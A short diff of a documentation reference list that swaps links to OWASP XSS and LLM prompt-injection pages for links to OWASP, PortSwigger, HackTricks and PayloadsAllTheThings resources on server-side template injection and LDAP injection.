-- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-- [OWASP LLM Top 10 - Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) (LLM-specific)
-- [Agent Skills Guide](../../../../../../docs/references/AGENT_SKILLS_GUIDE.md)
+- [OWASP SSTI Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html)
+- [OWASP LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)
+- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
+- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
+- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
